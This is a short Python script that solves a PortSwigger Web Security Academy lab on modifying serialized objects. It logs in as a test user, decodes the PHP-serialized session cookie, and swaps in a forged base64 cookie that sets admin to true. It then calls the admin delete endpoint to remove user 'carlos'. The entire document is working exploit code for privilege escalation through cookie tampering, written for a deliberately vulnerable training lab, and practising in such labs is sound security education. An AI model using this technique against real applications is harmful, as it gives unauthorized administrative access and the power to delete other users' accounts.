# https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
# Lab: Modifying serialized objects
# Difficulty: APPRENTICE

import requests, base64 
from pwn import log
from urllib.parse import unquote 

sub = '0a4e004003dbb0568128c25f002100fa'
url = f'https://{sub}.web-security-academy.net'

s = requests.session()

def login():
    r = s.post(f'{url}/login', data={'username': 'wiener', 'password': 'peter'})
    log.info(f'Logging in as wiener: {r.status_code}')
    
def exploit():
    session_cookie = s.cookies.get('session')
    log.info(f'Cookie is serialized PHP object: {base64.b64decode(unquote(session_cookie))}')
    
    # Change admin to true (1)
    # O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
    s.cookies.set('session', 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d')
    
    # Delete the user 'carlos'
    r = s.get(f'{url}/admin/delete?username=carlos')
    
    if r.status_code != 200:
        log.error('Failed to delete user carlos')
        return
    log.success('Deleted user carlos')
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.info('Lab not solved yet')
    
if __name__ == '__main__':
    login()
    exploit()